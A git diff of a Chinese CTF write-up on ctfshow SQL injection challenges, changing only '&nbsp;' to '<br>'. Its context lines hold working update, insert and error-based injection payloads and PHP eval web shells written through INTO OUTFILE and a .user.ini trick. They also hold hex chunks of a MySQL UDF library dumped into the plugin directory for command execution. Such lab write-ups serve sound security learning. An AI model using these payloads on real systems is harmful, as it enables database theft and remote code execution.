@@ -6552,7 +6552,7 @@ select flagasba from ctfsh_ow_flagasaa
 
 <img src="\images\article_images\image-20250902003120953.png" alt="image-20250902003120953" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6562,7 +6562,7 @@ select flagasba from ctfsh_ow_flagasaa
 
 <img src="\images\article_images\image-20250902003323994.png" alt="image-20250902003323994" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6590,7 +6590,7 @@ select flagasba from ctfsh_ow_flagasaa
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6617,7 +6617,7 @@ select flagasba from flag
 0x73656c65637420666c6167617362612066726f6d20666c6167
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6627,7 +6627,7 @@ select flagasba from flag
 
 <img src="\images\article_images\image-20250902003601088.png" alt="image-20250902003601088" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6637,7 +6637,7 @@ select flagasba from flag
 
 <img src="\images\article_images\image-20250902003632043.png" alt="image-20250902003632043" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6649,7 +6649,7 @@ select flagasba from flag
 
 <img src="\images\article_images\image-20250902003738529.png" alt="image-20250902003738529" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6659,7 +6659,7 @@ select flagasba from flag
 
 <img src="\images\article_images\image-20250902003835041.png" alt="image-20250902003835041" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6687,7 +6687,7 @@ select flagasba from flag
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6714,7 +6714,7 @@ select flagasbas from flagaabbx
 0x73656c65637420666c616761736261732066726f6d20666c61676161626278
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6724,7 +6724,7 @@ select flagasbas from flagaabbx
 
 <img src="\images\article_images\image-20250902004051471.png" alt="image-20250902004051471" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6734,7 +6734,7 @@ select flagasbas from flagaabbx
 
 <img src="\images\article_images\image-20250902004118849.png" alt="image-20250902004118849" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6746,7 +6746,7 @@ select flagasbas from flagaabbx
 
 <img src="\images\article_images\image-20250902004221065.png" alt="image-20250902004221065" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6756,7 +6756,7 @@ select flagasbas from flagaabbx
 
 <img src="\images\article_images\image-20250902004319807.png" alt="image-20250902004319807" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6777,7 +6777,7 @@ update注入
   //无过滤
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6787,13 +6787,13 @@ password=1',username=(select group_concat(table_name) from information_schema.ta
 
 <img src="\images\article_images\image-20250902233642007.png" alt="image-20250902233642007" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250902233703141.png" alt="image-20250902233703141" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6805,13 +6805,13 @@ password=1',username=(select group_concat(column_name) from information_schema.c
 
 <img src="\images\article_images\image-20250902233833741.png" alt="image-20250902233833741" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250902233817972.png" alt="image-20250902233817972" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6821,13 +6821,13 @@ password=1',username=(select flagas from ctfshow_web.flaga) where 1=1#&username=
 
 <img src="\images\article_images\image-20250902233946564.png" alt="image-20250902233946564" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250902233929758.png" alt="image-20250902233929758" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6850,7 +6850,7 @@ update注入
 
 **使用 `)` 闭合 `MD5` 函数**
 
-&nbsp;
+<br>
 
 
 
@@ -6860,13 +6860,13 @@ password=1'),username=(select group_concat(table_name) from information_schema.t
 
 <img src="\images\article_images\image-20250903001248218.png" alt="image-20250903001248218" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903001158964.png" alt="image-20250903001158964" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6876,13 +6876,13 @@ password=1'),username=(select group_concat(column_name) from information_schema.
 
 <img src="\images\article_images\image-20250903001442039.png" alt="image-20250903001442039" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903001419909.png" alt="image-20250903001419909" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6892,13 +6892,13 @@ password=1'),username=(select flagass from ctfshow_web.flagaa) where 1=1#&userna
 
 <img src="\images\article_images\image-20250903001532039.png" alt="image-20250903001532039" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903001512925.png" alt="image-20250903001512925" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6921,7 +6921,7 @@ update注入
 
 **使用布尔盲注**
 
-&nbsp;
+<br>
 
 
 
@@ -6963,7 +6963,7 @@ while True:
     print(flag)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6986,14 +6986,14 @@ update注入
 
 **这一题过滤了单引号 `‘`**
 
-&nbsp;
+<br>
 
 
 
 **使用 `\'` 将会转义成普通字符，因此 `password` 传入 `\` 即可**
 **这样，`pass=' where username =`，再传入 `username` 进行注入，末尾多余的 `‘` 注释处理即可**
 
-&nbsp;
+<br>
 
 
 
@@ -7003,13 +7003,13 @@ password=\&username=,username=(select group_concat(table_name) from information_
 
 <img src="\images\article_images\image-20250903123928913.png" alt="image-20250903123928913" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903123845602.png" alt="image-20250903123845602" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7021,13 +7021,13 @@ password=\&username=,username=(select group_concat(column_name) from information
 
 <img src="\images\article_images\image-20250903124225466.png" alt="image-20250903124225466" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903124201867.png" alt="image-20250903124201867" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7037,13 +7037,13 @@ password=\&username=,username=(select flagass23s3 from flag23a)#
 
 <img src="\images\article_images\image-20250903124325723.png" alt="image-20250903124325723" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903124310999.png" alt="image-20250903124310999" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7068,7 +7068,7 @@ update注入
 
 **`information` 字符串包含 `or` ，因此不能使用**
 
-&nbsp;
+<br>
 
 
 
@@ -7084,7 +7084,7 @@ update注入
 - `clustered_index_size` → 聚簇索引页数
 - `sum_of_other_index_sizes` → 其他索引大小
 
-&nbsp;
+<br>
 
 
 
@@ -7094,7 +7094,7 @@ password=\&username=,username=(select group_concat(table_name) from mysql.innodb
 
 <img src="\images\article_images\image-20250903130026552.png" alt="image-20250903130026552" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7102,7 +7102,7 @@ password=\&username=,username=(select group_concat(table_name) from mysql.innodb
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -7121,13 +7121,13 @@ password=\&username=,username=(select b from (select 1,2 as b,3 union select * f
 
 <img src="\images\article_images\image-20250903131112364.png" alt="image-20250903131112364" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903131053372.png" alt="image-20250903131053372" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7153,7 +7153,7 @@ update注入
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -7163,13 +7163,13 @@ password=\&username=,username=(select group_concat(table_name) from mysql.innodb
 
 <img src="\images\article_images\image-20250903132600718.png" alt="image-20250903132600718" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903131813142.png" alt="image-20250903131813142" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7184,7 +7184,7 @@ password=\&username=,username=(select b from (select 1,2 as b,3 union select * f
 
 <img src="\images\article_images\image-20250903132838560.png" alt="image-20250903132838560" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7194,7 +7194,7 @@ password=\&username=,username=(select b from (select 1,2 as b,3 union select * f
 
 <img src="\images\article_images\image-20250903133014018.png" alt="image-20250903133014018" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7215,7 +7215,7 @@ insert注入
   //无过滤
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7227,13 +7227,13 @@ password=1
 
 <img src="\images\article_images\image-20250903134316880.png" alt="image-20250903134316880" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903134340764.png" alt="image-20250903134340764" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7245,13 +7245,13 @@ password=1
 
 <img src="\images\article_images\image-20250903134419813.png" alt="image-20250903134419813" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903134441594.png" alt="image-20250903134441594" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7263,13 +7263,13 @@ password=1
 
 <img src="\images\article_images\image-20250903134528266.png" alt="image-20250903134528266" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903134543664.png" alt="image-20250903134543664" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7292,7 +7292,7 @@ insert注入
 
 **过滤了空格，且经过测试，使用带 `*` 的payload无法实现成功注入**
 
-&nbsp;
+<br>
 
 
 
@@ -7304,7 +7304,7 @@ password=1
 
 <img src="\images\article_images\image-20250903135936598.png" alt="image-20250903135936598" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7312,7 +7312,7 @@ password=1
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -7324,13 +7324,13 @@ password=1
 
 <img src="\images\article_images\image-20250903140136801.png" alt="image-20250903140136801" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903140158434.png" alt="image-20250903140158434" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7342,7 +7342,7 @@ password=1
 
 <img src="\images\article_images\image-20250903140338333.png" alt="image-20250903140338333" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7367,7 +7367,7 @@ insert注入
   //过滤空格 or 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7379,13 +7379,13 @@ password=1
 
 <img src="\images\article_images\image-20250903151936246.png" alt="image-20250903151936246" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903152035198.png" alt="image-20250903152035198" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7397,13 +7397,13 @@ password=1
 
 <img src="\images\article_images\image-20250903152102212.png" alt="image-20250903152102212" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250903152119760.png" alt="image-20250903152119760" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7426,7 +7426,7 @@ insert注入
 
 **题目Hint：表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写**
 
-&nbsp;
+<br>
 
 
 
@@ -7452,7 +7452,7 @@ for a1 in "ab":
 
 <img src="\images\article_images\image-20250903152746741.png" alt="image-20250903152746741" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7473,7 +7473,7 @@ sql语句
   //无过滤
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7523,7 +7523,7 @@ while 1:
     print(flag)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7544,7 +7544,7 @@ sql语句
   //无过滤
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7576,7 +7576,7 @@ sql语句
 `LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7592,7 +7592,7 @@ filename=1.php' fields terminated by '<?php eval($_REQUEST[1]);?>'#
 
 <img src="\images\article_images\image-20250903201627802.png" alt="image-20250903201627802" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7606,7 +7606,7 @@ filename=1.php' fields terminated by '<?php eval($_REQUEST[1]);?>'#
 
 <img src="\images\article_images\image-20250903201656991.png" alt="image-20250903201656991" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7620,7 +7620,7 @@ filename=1.php' fields terminated by '<?php eval($_REQUEST[1]);?>'#
 
 <img src="\images\article_images\image-20250903201819479.png" alt="image-20250903201819479" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7641,7 +7641,7 @@ sql语句
   //过滤了php
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7653,7 +7653,7 @@ sql语句
 
 **为保证 `auto_prepend_file=1.jpg` 单独一行，在字符串前后添加 `0a` 进行换行，最终为 `0x0a6175746f5f70726570656e645f66696c653d312e6a70670a`**
 
-&nbsp;
+<br>
 
 
 
@@ -7667,7 +7667,7 @@ filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f7072657065
 
 <img src="\images\article_images\image-20250903221809840.png" alt="image-20250903221809840" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7681,7 +7681,7 @@ filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#
 
 <img src="\images\article_images\image-20250903221532567.png" alt="image-20250903221532567" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7695,7 +7695,7 @@ filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#
 
 <img src="\images\article_images\image-20250903221633240.png" alt="image-20250903221633240" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7709,7 +7709,7 @@ filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#
 
 <img src="\images\article_images\image-20250903221715881.png" alt="image-20250903221715881" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7717,7 +7717,7 @@ filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#
 
 **预估为非预期解**
 
-&nbsp;
+<br>
 
 
 
@@ -7735,7 +7735,7 @@ filename=file.p\hp' lines starting by 3c3f706870206576616c28245f504f53545b315d29
 
 <img src="\images\article_images\image-20250903222456749.png" alt="image-20250903222456749" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7749,7 +7749,7 @@ filename=file.p\hp' lines starting by 3c3f706870206576616c28245f504f53545b315d29
 
 <img src="\images\article_images\image-20250903222523856.png" alt="image-20250903222523856" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7770,13 +7770,13 @@ sql语句
   //无过滤
 ```
 
-&nbsp;
+<br>
 
 
 
 **`extractvalue(目标xml文档，xml路径)` : 对XML文档进行查询的函数**  
 
-&nbsp;
+<br>
 
 
 
@@ -7788,7 +7788,7 @@ sql语句
 
 如果 `xpath` 开头是字母，mysql 会把它尝试解析为 xpath 路径，因此在前面添加 `1` 用来强制制造错误，保证结果一定出现在报错信息里
 
-&nbsp;
+<br>
 
 
 
@@ -7798,7 +7798,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904095706751.png" alt="image-20250904095706751" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7808,7 +7808,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904095838482.png" alt="image-20250904095838482" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7816,7 +7816,7 @@ sql语句
 
 - 作用：取字符串 **右边 n 个字符**
 
-&nbsp;
+<br>
 
 
 
@@ -7829,13 +7829,13 @@ sql语句
 
 <img src="\images\article_images\image-20250904100451381.png" alt="image-20250904100451381" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250904100541237.png" alt="image-20250904100541237" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7861,7 +7861,7 @@ sql语句
   过滤updatexml
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7871,7 +7871,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904105242051.png" alt="image-20250904105242051" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7881,7 +7881,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904105334612.png" alt="image-20250904105334612" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7892,13 +7892,13 @@ sql语句
 
 <img src="\images\article_images\image-20250904105543401.png" alt="image-20250904105543401" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250904105443894.png" alt="image-20250904105443894" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7920,7 +7920,7 @@ sql语句
   过滤updatexml extractvalue
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -7940,7 +7940,7 @@ group by x;
 - `floor(rand(0)*2)`：结果只有 `0` 或 `1`
 - `group by x`：分组的时候会出现 **重复键值**，导致报错：
 
-&nbsp;
+<br>
 
 
 
@@ -7952,7 +7952,7 @@ group by x;
 
 <img src="\images\article_images\image-20250904111140674.png" alt="image-20250904111140674" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7962,7 +7962,7 @@ group by x;
 
 <img src="\images\article_images\image-20250904111224910.png" alt="image-20250904111224910" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -7972,7 +7972,7 @@ group by x;
 
 <img src="\images\article_images\image-20250904111327479.png" alt="image-20250904111327479" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8021,7 +8021,7 @@ print(f"最终结果: {flag}")
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -8047,7 +8047,7 @@ sql语句
 `ceil()：向上取整`
 `round()：四舍五入`**
 
-&nbsp;
+<br>
 
 
 
@@ -8055,7 +8055,7 @@ sql语句
 
 **为了区分保留字（某个表/字段恰好取了 `select`、`order`、`desc` 等名字） 、支持特殊字符（`-`、空格、中文、大小写敏感），则需要使用反引号 `` ` `` 进行包裹**
 
-&nbsp;
+<br>
 
 
 
@@ -8063,7 +8063,7 @@ sql语句
 
 **`count(*)` 为聚合函数，聚合列允许不出现在 `group by`**
 
-&nbsp;
+<br>
 
 
 
@@ -8073,7 +8073,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904130208682.png" alt="image-20250904130208682" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8085,7 +8085,7 @@ sql语句
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -8095,7 +8095,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904130406274.png" alt="image-20250904130406274" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8138,7 +8138,7 @@ sql语句
 - 在 Windows 下，UDF 文件后缀是 **`.dll`**，在 Linux 下是 **`.so`**。
 - 把编译好的动态库放到 MySQL 的插件目录里（一般是 `/usr/lib/mysql/plugin/` 或者配置文件里指定的 `plugin_dir`），然后用 SQL 注册函数。
 
-&nbsp;
+<br>
 
 
 
@@ -8152,7 +8152,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904153041868.png" alt="image-20250904153041868" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8164,7 +8164,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904153151792.png" alt="image-20250904153151792" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8180,7 +8180,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904153318603.png" alt="image-20250904153318603" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8192,7 +8192,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904154202481.png" alt="image-20250904154202481" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8202,7 +8202,7 @@ sql语句
 /api/?id=1';select '000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e' into dumpfile '/usr/lib/mariadb/plugin/2.txt'%23
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8212,7 +8212,7 @@ sql语句
 /api/?id=1';select '332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000' into dumpfile '/usr/lib/mariadb/plugin/3.txt'%23
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -8224,7 +8224,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904153430635.png" alt="image-20250904153430635" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8236,7 +8236,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904153923044.png" alt="image-20250904153923044" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -8246,7 +8246,7 @@ sql语句
 
 <img src="\images\article_images\image-20250904154630579.png" alt="image-20250904154630579" style="zoom:25%;" />
 
